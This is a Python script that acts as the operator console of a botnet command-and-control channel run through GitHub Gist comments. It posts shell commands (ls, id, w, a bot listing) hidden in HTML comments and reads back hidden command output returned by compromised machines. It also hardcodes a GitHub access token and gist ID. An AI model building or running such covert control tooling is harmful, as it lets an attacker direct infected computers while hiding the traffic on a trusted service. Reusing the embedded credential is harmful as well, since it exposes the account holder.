#!/usr/bin/env python
import datetime
import requests
import json
import re

GITHUB_API = "https://api.github.com"
API_TOKEN = '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'
GIST_ID = '11fc787784a6a18ee1b89f6ceb4f4803'
last_check_time = datetime.datetime.now()


# form a request URL
url = GITHUB_API + "/gists/" + GIST_ID + "/comments"
userInput = ''

while userInput != 'exit':
    # read user input
    print('Type command ([exit] = end app | [post] = create new comment | [read] = print output of all pending commands) : ')
    userInput = str(input())
    if userInput == 'exit':
        print('Bye :-)')
    elif userInput == 'read':
        print('Output of all pending commands:')
        headers = {'Authorization': 'Bearer %s' % API_TOKEN, 'Accept': 'application/json',
                   'X-GitHub-Api-Version': '2022-11-28'}
        params = {'scope': 'gist'}

        # make a GET request (load all comments in GitHub channel)
        results = requests.get(url, headers=headers, params=params).json()

        # obtain all new comments from gist channel
        for comment in results:
            # add one hour (for GTM +1)
            date = datetime.datetime.strptime(comment['updated_at'], '%Y-%m-%dT%H:%M:%SZ') + datetime.timedelta(hours=1)
            if date > last_check_time:
                # if comment is new -> read its body (text hidden in a markdown comment)
                hidden_text = re.findall('<!-- (.+?) -->', comment['body'])
                for command_output in hidden_text[1:]:
                    # print output for old commands
                    print(command_output)
        # update last check date time
        last_check_time = datetime.datetime.now()

    elif userInput == 'post':
        print('Type comment contents (anything):')
        contentInput = str(input())
        print('Type embedded command ([ls] - list directories, [id], [w], [bots] - list all bot ids):')
        commandInput = str(input())

        # print headers,parameters,payload
        headers = {'Authorization': 'Bearer %s' % API_TOKEN, 'Accept': 'application/vnd.github+json',
                   'X-GitHub-Api-Version': '2022-11-28'}
        params = {'scope': 'gist'}
        payload = {"body": contentInput + ' <!-- ' + commandInput + ' -->'}

        # make a POST request (create new comment in GitHub channel)
        res = requests.post(url, headers=headers, params=params, data=json.dumps(payload))

        # print response status
        print(res.status_code)
    else:
        print('Invalid user input!')

